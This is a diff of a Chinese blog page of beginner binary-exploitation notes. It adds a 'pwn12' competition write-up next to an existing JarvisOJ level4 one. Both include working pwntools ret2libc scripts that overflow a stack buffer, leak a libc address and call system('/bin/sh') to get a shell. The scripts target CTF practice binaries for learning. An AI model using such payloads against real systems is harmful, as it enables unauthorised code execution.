@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="二进制安全、pwn," />
+  <meta name="keywords" content="二进制安全|pwn," />
 
 
 
@@ -96,19 +96,19 @@
 
 
 
-<meta name="description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
-<meta name="keywords" content="二进制安全、pwn">
+<meta name="description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4  国赛技能赛华东区线下赛 pwn12">
+<meta name="keywords" content="二进制安全|pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【pwn】入门笔记">
 <meta property="og:url" content="http://yoursite.com/【pwn】入门笔记/index.html">
 <meta property="og:site_name" content="wyx&#39;s blog">
-<meta property="og:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
+<meta property="og:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4  国赛技能赛华东区线下赛 pwn12">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/【pwn】入门笔记/1531318071045.png">
-<meta property="og:updated_time" content="2018-08-06T12:53:55.223Z">
+<meta property="og:updated_time" content="2018-08-08T12:08:36.216Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="【pwn】入门笔记">
-<meta name="twitter:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4">
+<meta name="twitter:description" content="Linux-x86  JarvisOJ-Pwn-level1  JarvisOJ-Pwn-level2  JarvisOJ-Pwn-level3  JarvisOJ-Pwn-level4  国赛技能赛华东区线下赛 pwn12">
 <meta name="twitter:image" content="http://yoursite.com/【pwn】入门笔记/1531318071045.png">
 
 
@@ -332,8 +332,8 @@
               
                 <span class="post-meta-item-text">更新于</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2018-08-06T20:53:55+08:00">
-                2018-08-06
+              <time title="更新于" itemprop="dateModified" datetime="2018-08-08T20:08:36+08:00">
+                2018-08-08
               </time>
             
           </span>
@@ -371,6 +371,7 @@
 <li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level2</li>
 <li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level3</li>
 <li style="list-style: none"><input type="checkbox" checked> JarvisOJ-Pwn-level4</li>
+<li style="list-style: none"><input type="checkbox" checked> 国赛技能赛华东区线下赛 pwn12</li>
 </ul>
 <a id="more"></a>
 <h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><blockquote>
@@ -387,6 +388,8 @@
 <h3 id="JarvisOJ-level4"><a href="#JarvisOJ-level4" class="headerlink" title="JarvisOJ level4"></a>JarvisOJ level4</h3><p>​    在未能得到程序调用的libc文件的情况下，我们就需要通过泄露内存的手段来获取libc中某函数的地址，然后通过版本对比得到其它函数或字符串的偏移量达到调用system(‘/bin/sh’)的目的。</p>
 <p>​    这道题目并没有给出libc文件，首先通过payload1调用write函数输出libc中某个函数得实际地址，在下面代码中使用得write函数。然后通过LibcSearcher得到对应libc得版本号，从而获得system函数和”/bin/sh”字符串的相对地址。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">'write'</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">got_write = elf.got[<span class="string">'write'</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x0804844B</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9880</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x8c</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = hex(u32(p.recv(<span class="number">4</span>)))</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"write"</span>,write_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_binsh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">offset_write = obj.dump(<span class="string">"write"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - offset_write + offset_system</span><br><span class="line">binsh_addr = write_addr - offset_write + offset_binsh</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(system_addr) + <span class="string">"aaaa"</span> + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="国赛技能赛华东区线下赛-pwn12"><a href="#国赛技能赛华东区线下赛-pwn12" class="headerlink" title="国赛技能赛华东区线下赛 pwn12"></a>国赛技能赛华东区线下赛 pwn12</h3><p>​    foo函数里，在gets函数后有一个puts输入内容的函数，要先接收puts的内容才能获得puts的内存地址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">foo_addr = <span class="number">0x0804859F</span></span><br><span class="line">plt_puts = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">got_puts = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'?\n'</span>)</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x20</span> + p32(plt_puts) + p32(foo_addr) +p32(got_puts)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(p32(got_puts) + <span class="string">'\x0a'</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>,puts_addr)</span><br><span class="line">offset_system = obj.dump(<span class="string">"system"</span>)</span><br><span class="line">offset_puts = obj.dump(<span class="string">"puts"</span>)</span><br><span class="line">offset_sh = obj.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - offset_puts + offset_system</span><br><span class="line">sh_addr = puts_addr - offset_puts + offset_sh</span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x20</span> +p32(system_addr) + p32(foo_addr) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.recvuntil(p32(sh_addr) + <span class="string">'\x0a'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>​     </p>
 
       
@@ -405,7 +408,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/二进制安全、pwn/" rel="tag"># 二进制安全、pwn</a>
+            <a href="/tags/二进制安全-pwn/" rel="tag"># 二进制安全|pwn</a>
           
         </div>
       
@@ -520,7 +523,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-count">6</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -584,7 +587,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-x86"><span class="nav-text">Linux-x86</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#练习题"><span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level1"><span class="nav-text">JarvisOJ level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level2"><span class="nav-text">JarvisOJ level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level3"><span class="nav-text">JarvisOJ level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level4"><span class="nav-text">JarvisOJ level4</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux-x86"><span class="nav-text">Linux-x86</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基本原理"><span class="nav-text">基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#练习题"><span class="nav-text">练习题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level1"><span class="nav-text">JarvisOJ level1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level2"><span class="nav-text">JarvisOJ level2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level3"><span class="nav-text">JarvisOJ level3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JarvisOJ-level4"><span class="nav-text">JarvisOJ level4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#国赛技能赛华东区线下赛-pwn12"><span class="nav-text">国赛技能赛华东区线下赛 pwn12</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
